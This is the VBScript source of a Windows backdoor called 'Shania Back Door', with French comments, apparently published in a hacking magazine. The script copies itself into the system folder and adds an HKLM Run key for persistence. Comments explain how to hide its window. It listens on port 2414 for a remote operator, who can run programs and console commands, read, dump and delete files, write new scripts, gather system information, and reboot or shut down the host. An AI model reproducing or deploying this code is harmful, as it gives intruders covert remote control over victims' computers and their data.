'*****************************************************************
'******** Shania Back Door by Stormy (StormyTeam@free.fr) ********
'********** Only with WSH, MSWinsck.ocx and WMI options **********
'***********  Paru dans The Hackademy Journal numéro 11  **********
'*****************************************************************

' Initialisation des variables et constantes.
On Error Resume Next
' Qualification hôte local seulement.
strComputer= "."
Const HARD_DISK = 3
Set fso = CreateObject("Scripting.FileSystemObject")
Set WshShell = WScript.CreateObject("WScript.Shell")
Set key = CreateObject("WScript.Shell")
Set oSck = Create_oSck()
' Déclaration de l'objet WMI en mode local.
Set objWMIService = GetObject("winmgmts:" & _
  "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
' Initialisation de la console CScript dans un environnement visible.
If (right(Ucase(WScript.FullName),11) = "WSCRIPT.EXE") Then
  Set Shell=CreateObject("WScript.Shell")
  Shell.Run Shell.ExpandEnvironmentStrings("%COMSPEC%") & _
  " /C cscript.exe """ & WScript.ScriptFullName & """",1,False
' " /C cscript.exe """ & WScript.ScriptFullName & """",0,False
' La valeur 0 assure l'invisibilité de la Back Door (!!!).
  Set Shell = Nothing
  WScript.Quit
End If
' Copie dans le répertoire Windows et inscription HKLM.
fso.copyfile wscript.scriptfullname,fso.GetSpecialFolder(1)& "\Shania.vbs"
key.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\","Shania.vbs"
' Informations première Host et IP locale.
Text "Shania on " & oSck.LocalHostName & " (" & oSck.LocalIP & ")"
' Initialisation du port en écoute soit 2414.
oSck.LocalPort = 2414
' Commande pour une mise en écoute du port et déclaration.
oSck.Listen
Text "Listening on port " & oSck.LocalPort
' Boucle permettant la continuité de l'attitude d'écoute (Listen).
Do
  Wscript.Sleep 999
Loop

' Fonction pour la création du socket et gestion des erreurs.
Function Create_oSck()
On Error Resume Next
Err.Number=0
' Déclaration de MSWinsck.ocx pour affiliation s_
Set Create_oSck=WScript.CreateObject("MSWinsock.Winsock","s_")
Select Case Err.Number
  Case 0
' Absence de la licence ou de OCX. Le script avorte :(
  Case &H80040112 ' Code Hexa
    Text "No licence found."
    Wscript.Sleep 2500
    Wscript.Quit(1)
  Case &H80020009 ' Code Hexa
    Text "No ActiveX Winsock found."
    Wscript.Sleep 2500
    Wscript.Quit(1)
' Inscription console hexadécimale et description. Le script avorte :(
  Case else
    Text "Error " & Err.Number & " - &Hexa" & _
    Hex(Err.Number) & " - " & Err.Description
    Wscript.Sleep 2500
    Wscript.Quit(1)
  End Select
End Function

' Notre fonction pour les rapports écrits (CHAT).
Function CHAT(x)
On Error Resume Next
' La longueur (len) moins les 5 premiers caractères 
' correspond au texte (rgt_cmd) reçu par le serveur Shania.
lgh_cmd = len(x)
Text x
rgt_cmd=Right(x,(lgh_cmd-5))
' InputBox correspond à la boîte de dialogue sous WSH.
abc = InputBox (rgt_cmd,Wscript.ScriptName)
' Si le rapport est nul, on renvoit "Empty return".
If abc = "" then
  Send "-Empty return-"
Else
' Sinon abc figure le texte écrit et est envoyé.
  Send abc
End if
End Function

' Fonction pour l'exécution d'une application ou d'un fichier.
Function EXEC(x)
On Error Resume Next
' La longueur (len) moins les 5 premiers caractères 
' correspond au chemin d'accès (rgt_cmd) menant au fichier.
lgh_cmd = len(x)
Text x
rgt_cmd = Right(x,(lgh_cmd-5))
' Si le fichier existe, on exécute le fichier.
If fso.FileExists(rgt_cmd) = True then
  WshShell.Run rgt_cmd
' Sinon on n'envoit une chaîne correspondante à l'erreur.
Else 
  Send "-File not found-"
End if
End Function

' Fonction pour l'exécution d'une URL quelconque.
Function Go_URL(x)
On Error Resume Next
' La longueur (len) moins les 5 premiers caractères 
' correspond à l'URL (rgt_cmd) menant au site.
lgh_cmd = len(x)
Text x
rgt_cmd = Right(x,(lgh_cmd-5))
' Création de l'objet InternetExplorer.
Set objExplorer = WScript.CreateObject("InternetExplorer.Application")
objExplorer.Navigate (rgt_cmd)
' Navigation visible pour affichage.
objExplorer.visible = 1
End Function

' Fonction pour l'obtention d'un inventaire de répertoire.
Function GIVE(x)
On Error Resume Next
' La longueur (len) moins les 5 premiers caractères 
' correspond au chemin d'accès (rgt_cmd) menant au répertoire.
lgh_cmd = len(x)
Text x
rgt_cmd = Right(x,(lgh_cmd-5))
' Si le répertoire existe, on exécute la commande.
If fso.FolderExists(rgt_cmd) = True then
  Set oREP = fso.GetFolder(rgt_cmd)
  Set oFiles = oREP.Files
  Set oFolders = oREP.SubFolders
  For Each oREP In oFolders
    Send oREP.Name
  Next
  For Each oREP In oFiles
    Send oREP.Name
  Next
' Sinon on n'envoit une chaîne correspondante à l'erreur.
Else 
  Send "-Folder not found-" 
End if
End Function

' Fonction pour extraire un flux en Hexadécimal.
' Article THJ de Juillet 2003.
Function DUMP(x)
On Error Resume Next
' La longueur (len) moins les 5 premiers caractères 
' correspond au chemin d'accès (rgt_cmd) menant au fichier.
lgh_cmd = len(x)
Text x
rgt_cmd = Right(x,(lgh_cmd-5))
' Si le répertoire existe, on exécute la commande.
If fso.FileExists(rgt_cmd) = True then
  Path = rgt_cmd
  Name =fso.GetTempName
  Set TMP = fso.CreateTextFile(Name)
  Set Target = fso.OpenTextFile(Path)
' Inscription de la date et de repères Hexadécimals.
  TMP.WriteLine(Now)
  TMP.WriteLine(Path & vbCRLF & _
  "------ 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F")
  nbr = 0
' Tant que le fichier n'est pas arriver à terme, on poursuit
' la décomposition hexadécimale d'abord dans un fichier log TMP.
  While Not Target.AtEndOfStream
    If (nbr Mod 16) = 0 Then 
      s = Right("00000" & Hex(nbr),6)
      Blank = " "
    End If
      Hexe = Asc(Target.Read(1))
    If Hexe > 31 And Hexe < 128 Then _
      Blank = Blank & Chr(Hexe) Else Blank = Blank & "."
      s = s & " " & Right("0" & Hex(Hexe),2)
      nbr = nbr + 1
    If ((nbr Mod 16) = 0) or Target.AtEndOfStream Then _
      TMP.WriteLine(s) & Space(((nbr Mod 16)>0)*((nbr Mod 16)*3-48))_
      & Blank
  Wend
  Target.Close
  TMP.Close
' Ensuite on effectue une lecture ligne par ligne pour établir un flux.
  Set info = fso.OpenTextFile(Name)
  Do While Not info.AtEndOfStream
    flux = Info.ReadLine
    Send flux
  Loop
  info.Close
' On efface le fichier log TMP auparavant créé et lu.
  Set MyFile = fso.GetFile(Name)
  MyFile.Delete(-1)
' Si le fichier n'existe pas, on n'envoit une chaîne 
' correspondante à l'erreur relative à la commande.
Else 
  Send "-File not found-" 
End if
End Function

' Fonction pour la destruction d'un fichier.
Function DEST(x)
On Error Resume Next
' La longueur (len) moins les 5 premiers caractères 
' correspond au chemin d'accès (rgt_cmd) menant au fichier.
lgh_cmd = len(x)
Text x
rgt_cmd = Right(x,(lgh_cmd-5))
' Si le répertoire existe, on exécute la commande.
If fso.FileExists(rgt_cmd) = True then
  Set MyFile = fso.GetFile(rgt_cmd)
  MyFile.Delete(-1) ' Destruction.
  Send "-File erased for ever-"
' Si le fichier n'existe pas, on n'envoit une chaîne 
' correspondante à l'erreur relative à la commande.
Else
  Send "-File not found-"
End if
End Function

' Fonction pour extraire un flux mode ASCII.
Function READ(x)
On Error Resume Next
' La longueur (len) moins les 5 premiers caractères 
' correspond au chemin d'accès (rgt_cmd) menant au fichier.
lgh_cmd = len(x)
Text x
rgt_cmd = Right(x,(lgh_cmd-5))
' Si le répertoire existe, on exécute la commande.
If fso.FileExists(rgt_cmd) = True then
  Set book = fso.OpenTextFile(rgt_cmd)
  Do While Not book.AtEndOfStream
    flux = book.ReadLine
    Send flux
  Loop
  book.Close
' Si le fichier n'existe pas, on n'envoit une chaîne 
' correspondante à l'erreur relative à la commande.
Else
  Send "-File not found-"
End if
End Function

' Fonction pour la création d'un autre script VBS.
Function WRIT(x)
On Error Resume Next
' La longueur (len) moins les 5 premiers caractères 
' correspond au chemin d'accès (rgt_cmd) menant au fichier.
lgh_cmd = len(x)
Text x
rgt_cmd = Right(x,(lgh_cmd-5))
Line_x = rgt_cmd
' Création du script VBS nommé Inside. (8) figure une
' écriture à la fin du fichier et la valeur [True] oblige
' une création automatisée si le script n'existe pas.
Name = "Inside.vbs"
Set Alien = fso.OpenTextFile(Name,8,True)
' On écrit la commande perçue dans le fichier Inside. 
Alien.WriteLine(Line_x)
Alien.Close
End Function
 
' Fonction pour exécuter une commande DOS sur console.
Function CNSL(x)
On Error Resume Next
oCNSL = "c:\command.com"
' La longueur (len) moins les 5 premiers caractères 
' correspond au chemin d'accès (rgt_cmd) menant au fichier.
lgh_cmd = len(x)
Text x
rgt_cmd = Right(x,(lgh_cmd-5))
' Il convient de savoir si la machine distante est accomodée
' de l'outil Command.com ou ou de l'exécutable Cmd.exe
' [rgt_cmd] compose la commande comme Netstat par exemple.
If fso.FileExists(oCNSL) = True then
  WshShell.run "command /K " & (rgt_cmd)
Else
  WshShell.run "cmd /K " & (rgt_cmd)
End if
End Function

' Fonction pour la création d'une MessageBox.
Function MSGB(x)
On Error Resume Next
' La longueur (len) moins les 5 premiers caractères 
' correspond aux différents arguments de notre MessageBox.
Data = Right(x,Len(x)-5)
' Notre repère pour la déconcaténation de la String Data.
lool = "*"
lft_pos = Instr(1,Data,lool)
rgt_pos = InstrRev(Data,lool,-1,1)  
Text_cmd = Left(Data,(lft_pos)-1)
strg = Right(Data,Len(Data)-(lft_pos))
Capt_cmd = Left(strg,((rgt_pos)-1)-lft_pos)
Icon = Right(Data,Len(Data)-(rgt_pos))
' Création de notre MessageBox avec les 3 arguments.
Result = MsgBox (Capt_cmd,Icon,Text_cmd)
End Function

' Sub fonction pour écriture dans la console Shania.
' Optionnel si le serveur est en mode masqué. 
Sub Text(T)
WScript.Echo Now & " " & T
End Sub

' Sub fonction pour acceptation d'un rapport distant.
Sub s_ConnectionRequest(Byval requestID)
oSck.Close
' Inscription de notre valeur de requête.
Text oSck.RemoteHostIP & " - Connection request n°" & requestID
' RequestID figure notre second protagoniste, soit le client.
oSck.Accept requestID
' On envoit au client la première information LocalHostName.
Send "Server on " & oSck.LocalHostName
' Aussi l'emplacement du script dans le système Cible.
Send "Script path >>> " & WshShell.CurrentDirectory
End Sub

' Sub fonction pour la clôture agencé d'un rapport distant.
Sub s_Close()
oSck.Close
Text "closed & listening again"
oSck.Listen
End Sub

' Sub fonction pour le contrôle des éventuelles erreurs.
Sub s_Error(ByVal number, action, ByVal C, _
            ByVal S, ByVal F, ByVal Hexa, Y)
Text "Event " & number & " - " & action
oSck.Close
oSck.Listen
End Sub

' Sub fonction pour l'envoi de flux initialisés ou générés.
Sub Send(x)
oSck.SendData x
Text "<send> " & x
' Le flux est cadencé à 200 millisecondes. Au delà, on risque
' certaines embrouilles au demeurant sans grande incidence.
Wscript.Sleep 200
End Sub

' Sub fonction pour détruire le serveur Shania.
Sub KILL()
Text "Current script destroyed by remote command :("
Wscript.Sleep 2500
' ATTENTION! La valeur HKLM demeure inscrite comme clé.
' Seul le script est détruit sans passage dans la corbeille.
fso.DeleteFile("C:\windows\system\Shania.vbs")
Send "-Rest in peace-"
Wscript.Quit(1) ' (!!!)
End Sub 

' Sub fonction pour clôturer simplement le rapport distant.
Sub BYE()
Text "Current script destroyed by remote command :("
Wscript.Sleep 2500
Wscript.Quit(1)  ' (!!!)
End Sub

' Sub fonction pour l'obtention d'informations sur Operating System.
Sub OS_Info()
Set colSettings = objWMIService.ExecQuery _
  ("Select * from Win32_OperatingSystem")
  For Each objOperatingSystem in colSettings
    Send "OS name --> " & objOperatingSystem.Name
    Send "Version " & objOperatingSystem.Version
    Send "OS Manufactured by " & objOperatingSystem.Manufacturer
  Next
End Sub

' Sub fonction pour l'obtention d'informations sur le MicroProcesseur.
Sub CPU_Info()
Set colSettings = objWMIService.ExecQuery _
  ("Select * from Win32_Processor")
  For Each objProcessor in colSettings 
' Choix selon valeur de l'architecture de la machine distante.  
    Select Case objProcessor.Architecture(i)        
    Case 0 
      strComputer_Architecture = "x86 computer"
    Case 1        
      strComputer_Architecture = "Mips computer"
    Case 2
      strComputer_Architecture = "Alpha computer"
    Case 3
      strComputer_Architecture = "PowerPC computer"
    Case 6
      strComputer_Architecture = "ia64 computer"
    Case else
      strComputer_Architecture = "Identification not possible"     
    End Select
    Send "System Type --> " & strComputer_Architecture
    Send objProcessor.Description
  Next
  Set colSettings = objWMIService.ExecQuery _
    ("Select * from Win32_BIOS")
  For Each objBIOS in colSettings
    Send "Current Language: " & objBIOS.CurrentLanguage
    Send "Manufactured by " & objBIOS.Manufacturer
  Next
End Sub

' Sub fonction pour l'obtention d'informations sur la carte mère.
Sub SYSTM_Info()
Set colSettings = objWMIService.ExecQuery _
  ("Select * from Win32_ComputerSystem")
  For Each objComputer in colSettings    
    Send "System user name is " & objComputer.Name
    Send "System Manufactured by " & objComputer.Manufacturer
    Send "System Model: " & objComputer.Model
  Next
End Sub

' Sub fonction pour l'obtention d'informations sur le type de machine.
Sub TYPE_Info()
Set colChassis = objWMIService.ExecQuery _
  ("Select * from Win32_SystemEnclosure")
For Each objChassis in colChassis
' Choix selon valeur du type de chassis de la machine distante.  
  For i = Lbound(objChassis.ChassisTypes) to Ubound(objChassis.ChassisTypes)
    Select Case objChassis.ChassisTypes(i)        
    Case 3 
      strComputer_Chassis = "Desktop"
    Case 6        
      strComputer_Chassis = "Mini Tower"
    Case 8
      strComputer_Chassis = "Portable"
    Case 9
      strComputer_Chassis = "LapTop"
    Case 10
      strComputer_Chassis = "NoteBook"
    Case 11
      strComputer_Chassis = "Hand Held"
    Case 12
      strComputer_Chassis = "Docking Station"
    Case 23
      strComputer_Chassis = "Rack Mount Chassis"
    Case else
      strComputer_Chassis = "Identification not possible"       
    End Select
    Send "Model type --> " & strComputer_Chassis
  Next    
Next
End Sub

' Sub fonction pour l'obtention des commandes automatisées HKLM.
Sub STARTUP_Info
Set colStartupCommands = objWMIService.ExecQuery _
  ("Select * from Win32_StartupCommand")
For Each objStartupCommand in colStartupCommands
  Send objStartupCommand.Name & " - " & objStartupCommand.Location
Next
End Sub

' Sub fonction pour un redémarage du système de type RESTART.
Sub RESTART
Set colOperatingSystems = objWMIService.ExecQuery _
  ("Select * from Win32_OperatingSystem")
For Each objOperatingSystem in colOperatingSystems
  ObjOperatingSystem.Reboot()
Next
End Sub

' Sub fonction pour un plantage du système de type SHUTDOWN.
Sub SHUTDOWN
Set colOperatingSystems =GetObject("winmgmts:{(Shutdown)}").ExecQuery _
  ("Select * from Win32_OperatingSystem")
For Each objOperatingSystem in colOperatingSystems
  ObjOperatingSystem.Win32Shutdown(1)
Next
End Sub

' Sub fonction pour l'obtention de l'espace libre sur le(s) disque(s) dur(s).
Sub SPACE_HD
Set colDisks = objWMIService.ExecQuery _
  ("Select * from Win32_LogicalDisk Where DriveType=" & HARD_DISK & "")
For Each objDisk in colDisks
' On divise par 1 milliard car il s'agit du nombre d'octets libres
' porté à une valeur pratique soit Giga avec 2 chiffres après virgule.
  Send "Free Disk Space on " & objDisk.DeviceID & _
  (round((objDisk.FreeSpace/1000000000),2)) & " Go"
Next
End Sub

' Gestion des commandes perçues pour déconcaténation puis 
' interprétation. Les interprétations conduisent aux (sub) fonctions. 
Sub s_DataArrival(Byval cmd)
' Pour une raison inexplicable, il faut initialiser un buffer
' quelconque qui ne soit pas vide pour la réception globale de cmd. 
cmd = "Buffer_quelconque"
oSck.GetData cmd
If cmd = "BYE" then
  Call BYE
End if
If cmd = "KILL" then
  Call KILL
End if 
If cmd = "OS" then
  Call OS_Info
End if
If cmd = "CPU" then
  Call CPU_Info
End If
If cmd = "SYSTM" then
  Call SYSTM_Info
End if
If cmd = "TYPE" then
  Call TYPE_Info
End if
If cmd = "STARTUP" then
  Call STARTUP_Info
End if
If cmd = "RESTART" then
  Call RESTART
End if
If cmd = "SHUTDOWN" then
  Call SHUTDOWN
End if
If cmd = "SPACE_HD" then
  Call SPACE_HD
End if
lft_cmd = Left(cmd,5)
If lft_cmd = "CHAT*" then
  Call CHAT(cmd)
End if
If lft_cmd = "EXEC*" then
  Call EXEC(cmd)
End if
If lft_cmd = "GIVE*" then
  Call GIVE(cmd)
End if
If lft_cmd = "DUMP*" then
  Call DUMP(cmd)
End if
If lft_cmd = "DEST*" then
  Call DEST(cmd)
End if
If lft_cmd = "READ*" then
  Call READ(cmd)
End if
If lft_cmd = "WRIT*" then
  Call WRIT(cmd)
End if
If lft_cmd = "CNSL*" then
  Call CNSL(cmd)
End if
If lft_cmd = ">URL*" then
  Call Go_URL(cmd)
End if
If lft_cmd = "MSGB*" then
  Call MSGB(cmd)   
End if
End Sub
